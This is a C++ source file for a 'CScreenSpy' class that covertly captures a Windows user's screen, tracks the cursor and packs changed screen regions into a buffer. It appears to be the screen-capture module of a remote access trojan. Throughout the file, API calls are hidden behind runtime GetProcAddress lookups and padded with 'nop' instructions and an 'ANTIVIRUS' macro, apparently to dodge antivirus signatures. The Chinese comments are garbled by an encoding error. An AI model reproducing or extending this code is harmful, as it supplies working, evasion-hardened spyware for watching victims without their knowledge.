// ScreenSpy.cpp: implementation of the CScreenSpy class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "ScreenSpy.h"
#include "until.h"

#define RGB2GRAY(r,g,b) (((b)*117 + (g)*601 + (r)*306) >> 10)

#define DEF_STEP	19
#define OFF_SET		24
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

#ifdef _CONSOLE
#include <stdio.h>
#endif

HMODULE Chmodule=NULL;

CScreenSpy::CScreenSpy(int biBitCount, bool bIsGray, UINT nMaxFrameRate)
{
	Chmodule=LoadLibrary("GDI32.dll");

	switch (biBitCount)
	{
	case 1:
	case 4:
	case 8:
	case 16:
	case 32:
		m_biBitCount = biBitCount;
		break;
	default:
		m_biBitCount = 8;
	}
	
	if (!SelectInputWinStation())
	{
		m_hDeskTopWnd = GetDesktopWindow();
		m_hFullDC = GetDC(m_hDeskTopWnd);
	}

	m_dwBitBltRop	= SRCCOPY;

	m_bAlgorithm	= ALGORITHM_SCAN; // Ĭ��ʹ�ø���ɨ���㷨
	m_dwLastCapture	= GetTickCount();
	m_nMaxFrameRate	= nMaxFrameRate;
	m_dwSleep		= 1000 / nMaxFrameRate;
	m_bIsGray		= bIsGray;
    m_nFullWidth	= ::GetSystemMetrics(SM_CXSCREEN);
    m_nFullHeight	= ::GetSystemMetrics(SM_CYSCREEN);
    m_nIncSize		= 32 / m_biBitCount;

	m_nStartLine	= 0;

	typedef HDC (WINAPI *CreateCompatibleDCT)(HDC);
	__asm nop;
	__asm nop;
__asm nop;
	CreateCompatibleDCT pCreateCompatibleDC=(CreateCompatibleDCT)GetProcAddress(Chmodule,"CreateCompatibleDC");

	m_hFullMemDC	= pCreateCompatibleDC(m_hFullDC);
	m_hDiffMemDC	= pCreateCompatibleDC(m_hFullDC);
	m_hLineMemDC	= pCreateCompatibleDC(NULL);
	__asm nop;
	__asm nop;
__asm nop;
	m_hRectMemDC	= pCreateCompatibleDC(NULL);
	m_lpvLineBits	= NULL;
	m_lpvFullBits	= NULL;
    ANTIVIRUS
	m_lpbmi_line	= ConstructBI(m_biBitCount, m_nFullWidth, 1);
	m_lpbmi_full	= ConstructBI(m_biBitCount, m_nFullWidth, m_nFullHeight);
	m_lpbmi_rect	= ConstructBI(m_biBitCount, m_nFullWidth, 1);

	typedef HBITMAP (WINAPI *CreateDIBSectionT)(HDC,BITMAPINFO *,UINT,VOID **,HANDLE,DWORD);
	CreateDIBSectionT pCreateDIBSection=(CreateDIBSectionT)GetProcAddress(Chmodule,"CreateDIBSection");
    ANTIVIRUS
	m_hLineBitmap	= pCreateDIBSection(m_hFullDC, m_lpbmi_line, DIB_RGB_COLORS, &m_lpvLineBits, NULL, NULL);
	m_hFullBitmap	= pCreateDIBSection(m_hFullDC, m_lpbmi_full, DIB_RGB_COLORS, &m_lpvFullBits, NULL, NULL);
	m_hDiffBitmap	= pCreateDIBSection(m_hFullDC, m_lpbmi_full, DIB_RGB_COLORS, &m_lpvDiffBits, NULL, NULL);

	typedef HGDIOBJ (WINAPI *SelectObjectT)(HDC,HGDIOBJ);
	SelectObjectT pSelectObject=(SelectObjectT)GetProcAddress(Chmodule,"SelectObject");


	pSelectObject(m_hFullMemDC, m_hFullBitmap);
	pSelectObject(m_hLineMemDC, m_hLineBitmap);
	pSelectObject(m_hDiffMemDC, m_hDiffBitmap);
	
	::SetRect(&m_changeRect, 0, 0, m_nFullWidth, m_nFullHeight);

	// �㹻��
	m_rectBuffer = new BYTE[m_lpbmi_full->bmiHeader.biSizeImage * 2];
	m_nDataSizePerLine = m_lpbmi_full->bmiHeader.biSizeImage / m_nFullHeight;

	m_rectBufferOffset = 0;
}

CScreenSpy::~CScreenSpy()
{

	::ReleaseDC(m_hDeskTopWnd, m_hFullDC);

	typedef BOOL (WINAPI *DeleteDCT)(HDC);
	DeleteDCT pDeleteDC=(DeleteDCT)GetProcAddress(Chmodule,"DeleteDC");


	pDeleteDC(m_hLineMemDC);
	pDeleteDC(m_hFullMemDC);
	pDeleteDC(m_hRectMemDC);
	pDeleteDC(m_hDiffMemDC);

	typedef BOOL (WINAPI *DeleteObjectT)(HGDIOBJ);
	__asm nop;
	__asm nop;
__asm nop;
	DeleteObjectT pDeleteObject=(DeleteObjectT)GetProcAddress(Chmodule,"DeleteObject");

	pDeleteObject(m_hLineBitmap);
	pDeleteObject(m_hFullBitmap);
	pDeleteObject(m_hDiffBitmap);

	if (m_rectBuffer)
		delete[] m_rectBuffer;
	delete[]	m_lpbmi_full;
	delete[]	m_lpbmi_line;
    ANTIVIRUS
	delete[]	m_lpbmi_rect;
    ANTIVIRUS
	FreeLibrary(Chmodule);
}


LPVOID CScreenSpy::getNextScreen(LPDWORD lpdwBytes)
{
	static LONG	nOldCursorPosY = 0;
	if (lpdwBytes == NULL || m_rectBuffer == NULL)
		return NULL;

	SelectInputWinStation();

	// ����rect������ָ��
	m_rectBufferOffset = 0;

	// д��ʹ���������㷨
	WriteRectBuffer((LPBYTE)&m_bAlgorithm, sizeof(m_bAlgorithm));

	// д����λ��
	POINT	CursorPos;
	GetCursorPos(&CursorPos);
	WriteRectBuffer((LPBYTE)&CursorPos, sizeof(POINT));
	
	// д�뵱ǰ�������
	BYTE	bCursorIndex = m_CursorInfo.getCurrentCursorIndex();
	WriteRectBuffer(&bCursorIndex, sizeof(BYTE));

	// ����Ƚ��㷨
	if (m_bAlgorithm == ALGORITHM_DIFF)
	{
		// �ֶ�ɨ��ȫ��Ļ
		ScanScreen(m_hDiffMemDC, m_hFullDC, m_lpbmi_full->bmiHeader.biWidth, m_lpbmi_full->bmiHeader.biHeight);
		*lpdwBytes = m_rectBufferOffset + 
			Compare((LPBYTE)m_lpvDiffBits, (LPBYTE)m_lpvFullBits, m_rectBuffer + m_rectBufferOffset, m_lpbmi_full->bmiHeader.biSizeImage);
		return m_rectBuffer;
	}

	// ���λ�÷��仯�����ȵ�������������仯����(�����仯���� + DEF_STEP)����ɨ��
	// ������
	int	nHotspot = max(0, CursorPos.y - DEF_STEP);
	for (
		int i = ((CursorPos.y != nOldCursorPosY) && ScanChangedRect(nHotspot)) ? (nHotspot + DEF_STEP) : m_nStartLine; 
		i < m_nFullHeight; 
		i += DEF_STEP
		)
	{
		if (ScanChangedRect(i))
		{
			i += DEF_STEP;
		}
	}
	nOldCursorPosY = CursorPos.y;

	m_nStartLine = (m_nStartLine + 3) % DEF_STEP;
	*lpdwBytes = m_rectBufferOffset;

	// ���Ʒ���֡���ٶ�
	while (GetTickCount() - m_dwLastCapture < m_dwSleep)
		Sleep(1);
	InterlockedExchange((LPLONG)&m_dwLastCapture, GetTickCount());
    ANTIVIRUS
	return m_rectBuffer;
}



bool CScreenSpy::ScanChangedRect(int nStartLine)
{
	bool	bRet = false;
	LPDWORD p1, p2;

	typedef HDC (WINAPI *BitBltT)(HDC,int,int,int,int, HDC,int,int,DWORD);
	BitBltT pBitBlt=(BitBltT)GetProcAddress(Chmodule,"BitBlt");


	pBitBlt(m_hLineMemDC, 0, 0, m_nFullWidth, 1, m_hFullDC, 0, nStartLine, m_dwBitBltRop);
	// 0 �����һ��
	p1 = (PDWORD)((DWORD)m_lpvFullBits + ((m_nFullHeight - 1 - nStartLine) * m_nDataSizePerLine));
	p2 = (PDWORD)m_lpvLineBits;
	::SetRect(&m_changeRect, -1, nStartLine - DEF_STEP, -1, nStartLine + DEF_STEP * 2);

	for (int j = 0; j < m_nFullWidth; j += m_nIncSize)
	{
		if (*p1 != *p2)
		{
			if (m_changeRect.right < 0)
				m_changeRect.left = j - OFF_SET;
			m_changeRect.right = j + OFF_SET;
		}
		p1++;
		p2++;
	}
	
	if (m_changeRect.right > -1)
	{
		m_changeRect.left   = max(m_changeRect.left, 0);
		m_changeRect.top    = max(m_changeRect.top, 0);
		m_changeRect.right  = min(m_changeRect.right, m_nFullWidth);
		__asm nop;
		__asm nop;
__asm nop;
		m_changeRect.bottom = min(m_changeRect.bottom, m_nFullHeight);
		// ���Ƹı������
		CopyRect(&m_changeRect);
		bRet = true;
	}

	return bRet;
}
void CScreenSpy::setAlgorithm(UINT nAlgorithm)
{
	InterlockedExchange((LPLONG)&m_bAlgorithm, nAlgorithm);
}

LPBITMAPINFO CScreenSpy::ConstructBI(int biBitCount, int biWidth, int biHeight)
{
/*
biBitCount Ϊ1 (�ڰ׶�ɫͼ) ��4 (16 ɫͼ) ��8 (256 ɫͼ) ʱ����ɫ������ָ����ɫ���С
biBitCount Ϊ16 (16 λɫͼ) ��24 (���ɫͼ, ��֧��) ��32 (32 λɫͼ) ʱû����ɫ��
	*/
	int	color_num = biBitCount <= 8 ? 1 << biBitCount : 0;
	
	int nBISize = sizeof(BITMAPINFOHEADER) + (color_num * sizeof(RGBQUAD));
	BITMAPINFO	*lpbmi = (BITMAPINFO *) new BYTE[nBISize];
	    ANTIVIRUS
	BITMAPINFOHEADER	*lpbmih = &(lpbmi->bmiHeader);
	lpbmih->biSize = sizeof(BITMAPINFOHEADER);
	lpbmih->biWidth = biWidth;
	lpbmih->biHeight = biHeight;
	lpbmih->biPlanes = 1;
	lpbmih->biBitCount = biBitCount;
	lpbmih->biCompression = BI_RGB;
	lpbmih->biXPelsPerMeter = 0;
	lpbmih->biYPelsPerMeter = 0;
	lpbmih->biClrUsed = 0;
	lpbmih->biClrImportant = 0;
	lpbmih->biSizeImage = (((lpbmih->biWidth * lpbmih->biBitCount + 31) & ~31) >> 3) * lpbmih->biHeight;
	
	// 16λ���Ժ��û����ɫ��ֱ�ӷ���
	if (biBitCount >= 16)
		return lpbmi;
	ANTIVIRUS
    ANTIVIRUS
	HDC	hDC = GetDC(NULL);

	typedef HBITMAP (WINAPI *CreateCompatibleBitmapT)(HDC,int,int);
	ANTIVIRUS
    ANTIVIRUS
	CreateCompatibleBitmapT pCreateCompatibleBitmap=(CreateCompatibleBitmapT)GetProcAddress(Chmodule,"CreateCompatibleBitmap");
    ANTIVIRUS
	HBITMAP hBmp = pCreateCompatibleBitmap(hDC, 1, 1); // �߿���Ϊ0
	
	typedef int (WINAPI *GetDIBitsT)(HDC,HBITMAP,UINT,UINT,LPVOID,LPBITMAPINFO,UINT);
	GetDIBitsT pGetDIBits=(GetDIBitsT)GetProcAddress(Chmodule,"GetDIBits");
	pGetDIBits(hDC, hBmp, 0, 0, NULL, lpbmi, DIB_RGB_COLORS);



	ReleaseDC(NULL, hDC);

	typedef BOOL (WINAPI *DeleteObjectT)(HGDIOBJ);
    ANTIVIRUS
	DeleteObjectT pDeleteObject=(DeleteObjectT)GetProcAddress(Chmodule,"DeleteObject");
	pDeleteObject(hBmp);

	if (m_bIsGray)
	{
		for (int i = 0; i < color_num; i++)
		{
			int color = RGB2GRAY(lpbmi->bmiColors[i].rgbRed, lpbmi->bmiColors[i].rgbGreen, lpbmi->bmiColors[i].rgbBlue);
			lpbmi->bmiColors[i].rgbRed = lpbmi->bmiColors[i].rgbGreen = lpbmi->bmiColors[i].rgbBlue = color;
		}
	}

	return lpbmi;	
}

void CScreenSpy::WriteRectBuffer(LPBYTE	lpData, int nCount)
{
    ANTIVIRUS
	memcpy(m_rectBuffer + m_rectBufferOffset, lpData, nCount);
	m_rectBufferOffset += nCount;
}

LPVOID CScreenSpy::getFirstScreen()
{
	typedef HDC (WINAPI *BitBltT)(HDC,int,int,int,int, HDC,int,int,DWORD);
	BitBltT pBitBlt=(BitBltT)GetProcAddress(Chmodule,"BitBlt");
	__asm nop;
	__asm nop;
__asm nop;
	pBitBlt(m_hFullMemDC, 0, 0, m_nFullWidth, m_nFullHeight, m_hFullDC, 0, 0, m_dwBitBltRop);
	return m_lpvFullBits;
}

void CScreenSpy::CopyRect( LPRECT lpRect )
{
	int	nRectWidth = lpRect->right - lpRect->left;
	int	nRectHeight = lpRect->bottom - lpRect->top;

	LPVOID	lpvRectBits = NULL;
	// ����m_lpbmi_rect
	m_lpbmi_rect->bmiHeader.biWidth = nRectWidth;
	m_lpbmi_rect->bmiHeader.biHeight = nRectHeight;
	m_lpbmi_rect->bmiHeader.biSizeImage = (((m_lpbmi_rect->bmiHeader.biWidth * m_lpbmi_rect->bmiHeader.biBitCount + 31) & ~31) >> 3) 
		* m_lpbmi_rect->bmiHeader.biHeight;

	typedef HBITMAP (WINAPI *CreateDIBSectionT)(HDC,BITMAPINFO *,UINT,VOID **,HANDLE,DWORD);
	CreateDIBSectionT pCreateDIBSection=(CreateDIBSectionT)GetProcAddress(Chmodule,"CreateDIBSection");
	HBITMAP	hRectBitmap = pCreateDIBSection(m_hFullDC, m_lpbmi_rect, DIB_RGB_COLORS, &lpvRectBits, NULL, NULL);

	typedef HGDIOBJ (WINAPI *SelectObjectT)(HDC,HGDIOBJ);
	__asm nop;
	__asm nop;
__asm nop;
	SelectObjectT pSelectObject=(SelectObjectT)GetProcAddress(Chmodule,"SelectObject");
	pSelectObject(m_hRectMemDC, hRectBitmap);

	typedef HDC (WINAPI *BitBltT)(HDC,int,int,int,int, HDC,int,int,DWORD);
	BitBltT pBitBlt=(BitBltT)GetProcAddress(Chmodule,"BitBlt");

	pBitBlt(m_hFullMemDC, lpRect->left, lpRect->top, nRectWidth, nRectHeight, m_hFullDC, lpRect->left, lpRect->top, m_dwBitBltRop);
    ANTIVIRUS
	pBitBlt(m_hRectMemDC, 0, 0, nRectWidth, nRectHeight, m_hFullMemDC, lpRect->left, lpRect->top, SRCCOPY);

	WriteRectBuffer((LPBYTE)lpRect, sizeof(RECT));
    ANTIVIRUS
	WriteRectBuffer((LPBYTE)lpvRectBits, m_lpbmi_rect->bmiHeader.biSizeImage);

	typedef BOOL (WINAPI *DeleteObjectT)(HGDIOBJ);
	DeleteObjectT pDeleteObject=(DeleteObjectT)GetProcAddress(Chmodule,"DeleteObject");
	pDeleteObject(hRectBitmap);
}

UINT CScreenSpy::getFirstImageSize()
{
    ANTIVIRUS
	return m_lpbmi_full->bmiHeader.biSizeImage;
}


void CScreenSpy::setCaptureLayer(bool bIsCaptureLayer)
{
	DWORD dwRop = SRCCOPY;
	if (bIsCaptureLayer)
		dwRop |= CAPTUREBLT;
	InterlockedExchange((LPLONG)&m_dwBitBltRop, dwRop);
}

LPBITMAPINFO CScreenSpy::getBI()
{
	return m_lpbmi_full;
}

UINT CScreenSpy::getBISize()
{
	int	color_num = m_biBitCount <= 8 ? 1 << m_biBitCount : 0;
	
	return sizeof(BITMAPINFOHEADER) + (color_num * sizeof(RGBQUAD));
}

bool CScreenSpy::SelectInputWinStation()
{
	bool bRet = ::SwitchInputDesktop();
	if (bRet)
	{
		ReleaseDC(m_hDeskTopWnd, m_hFullDC);
		__asm nop;
		__asm nop;
__asm nop;
		m_hDeskTopWnd = GetDesktopWindow();
		m_hFullDC = GetDC(m_hDeskTopWnd);
	}	
	return bRet;	
}


void CScreenSpy::ScanScreen( HDC hdcDest, HDC hdcSrc, int nWidth, int nHeight)
{
	UINT	nJumpLine = 50;
	UINT	nJumpSleep = nJumpLine / 10; // ɨ����
	typedef HDC (WINAPI *BitBltT)(HDC,int,int,int,int, HDC,int,int,DWORD);
	BitBltT pBitBlt=(BitBltT)GetProcAddress(Chmodule,"BitBlt");
	// ɨ����Ļ
	for (int i = 0, int	nToJump = 0; i < nHeight; i += nToJump)
	{
		int	nOther = nHeight - i;
		
		if (nOther > nJumpLine)
			nToJump = nJumpLine;
		else
			nToJump = nOther;
		pBitBlt(hdcDest, 0, i, nWidth, nToJump, hdcSrc,	0, i, m_dwBitBltRop);
    ANTIVIRUS
		Sleep(nJumpSleep);
	}
}

// ����Ƚ��㷨��ĺ���
int CScreenSpy::Compare( LPBYTE lpSource, LPBYTE lpDest, LPBYTE lpBuffer, DWORD dwSize )
{
	// Windows�涨һ��ɨ������ռ���ֽ���������4�ı���, ������DWORD�Ƚ�
	LPDWORD	p1, p2;
	p1 = (LPDWORD)lpDest;
	p2 = (LPDWORD)lpSource;

	// ƫ�Ƶ�ƫ�ƣ���ͬ���ȵ�ƫ��
	int	nOffsetOffset = 0, nBytesOffset = 0, nDataOffset = 0;
	int nCount = 0; // ���ݼ�����
	// p1++ʵ�����ǵ�����һ��DWORD
	for (int i = 0; i < dwSize; i += 4, p1++, p2++)
	{
		if (*p1 == *p2)
			continue;
		// һ�������ݿ鿪ʼ
		// д��ƫ�Ƶ�ַ
		*(LPDWORD)(lpBuffer + nOffsetOffset) = i;
		// ��¼���ݴ�С�Ĵ��λ��
		nBytesOffset = nOffsetOffset + sizeof(int);
		nDataOffset = nBytesOffset + sizeof(int);
		nCount = 0; // ���ݼ���������

		// ����Dest�е�����
		*p1 = *p2;
		*(LPDWORD)(lpBuffer + nDataOffset + nCount) = *p2;

		nCount += 4;
		i += 4, p1++, p2++;
		
		for (int j = i; j < dwSize; j += 4, i += 4, p1++, p2++)
		{
			if (*p1 == *p2)
				break;

			// ����Dest�е�����
			*p1 = *p2;
			*(LPDWORD)(lpBuffer + nDataOffset + nCount) = *p2;
			nCount += 4;
		}
		// д�����ݳ���
		*(LPDWORD)(lpBuffer + nBytesOffset) = nCount;
		nOffsetOffset = nDataOffset + nCount;	
	}

	// nOffsetOffset ����д����ܴ�С
	return nOffsetOffset;
}
